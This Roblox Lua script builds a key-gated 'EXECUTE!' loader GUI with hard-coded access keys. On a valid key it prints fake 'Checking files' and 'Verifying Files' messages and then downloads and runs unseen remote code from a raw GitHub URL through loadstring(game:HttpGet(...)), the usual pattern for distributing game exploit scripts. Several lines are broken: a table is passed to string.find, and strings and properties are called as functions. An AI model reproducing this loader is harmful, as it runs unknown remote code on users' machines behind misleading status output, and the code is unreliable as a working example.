x = 5;
y = 1;
z = x + y;
-- Anahtarlar :
local keys = {
	"datsersy-17392739",
	"datsersy-19823974",
	"datsersy-12397175",
	"datsersy-19974617",
    "datsersy-81287412",
	"datsersy-82192171",
	"datsersy-45268162",
}
	-- Guiler
	local plr = game.Players.LocalPlayer
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local cs = Instance.new("ImageLabel")
local EXECUTE = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local keylabel = Instance.new("TextBox")

-- Sitilleri :

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Size = UDim2.new(0, 894, 0, 594)

cs.Parent = Frame
cs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
cs.BorderColor3 = Color3.fromRGB(255, 255, 255)
cs.Position = UDim2.new(-0.0223713666, 0, -0.0202020202, 0)
cs.Size = UDim2.new(0, 894, 0, 594)
cs.Image = "rbxassetid://11108324824"

EXECUTE.Name = "EXECUTE"
EXECUTE.Parent = Frame
EXECUTE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
EXECUTE.BackgroundTransparency = 1.000
EXECUTE.BorderColor3 = Color3.fromRGB(92, 106, 90)
EXECUTE.Position = UDim2.new(0.285234898, 0, 0.680134714, 0)
EXECUTE.Size = UDim2.new(0, 384, 0, 178)
EXECUTE.Font = Enum.Font.LuckiestGuy
EXECUTE.Text = "EXECUTE!"
EXECUTE.TextColor3 = Color3.fromRGB(0, 0, 0)
EXECUTE.TextSize = 51.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.225950822, 0, 0.0319865346, 0)
TextLabel.Size = UDim2.new(0, 450, 0, 104)
TextLabel.Font = Enum.Font.Michroma
TextLabel.Text = "Status : Offline"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 45.000

keylabel.Parent = Frame
keylabel.BackgroundColor3 = Color3.fromRGB(198, 198, 198)
keylabel.Position = UDim2.new(0.0201342274, 0, 0.680134654, 0)
keylabel.Size = UDim2.new(0, 856, 0, 32)
keylabel.Font = Enum.Font.SourceSans
keylabel.Text = "PUT YOUR KEY!"
keylabel.TextColor3 = Color3.fromRGB(0, 0, 0)
keylabel.TextSize = 14.000

-- Scripts:

local function MUFGIE_fake_script() -- EXECUTE.Script 
	local script = Instance.new('Script', EXECUTE)
	
	EXECUTE.MouseButton1Click:Connect(function()
		local text = script.Parent.Text
	
	if string.find(text, keys) then
		print("Checking files..")
		wait(0.5)
		print("Verifying Files..")
		wait(1)
		print("Starting script")
		wait(0.1)
		print("Done.")
		TextLabel.Text = "Status : Online"
		ScreenGui:Destroy()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/atturogamrkerap/asdasdasd/main/adfasdwadwwadwead"))()
	else
		wait(10)
		x -= 1;
		text("Invaild Key. Remaining Trial :", x)
	end
end)
end
coroutine.wrap(MUFGIE_fake_script)()
local function EIJP_fake_script() -- keylabel.LocalScript 
	local script = Instance.new('LocalScript', EXECUTE)
	if x == 1 then
	plr:Kick("Invaild Key!")
	end
end
coroutine.wrap(EIJP_fake_script)()
wait(10)
keylabel.Text("Status : Online")
wait(2)
ScreenGui:Destroy()
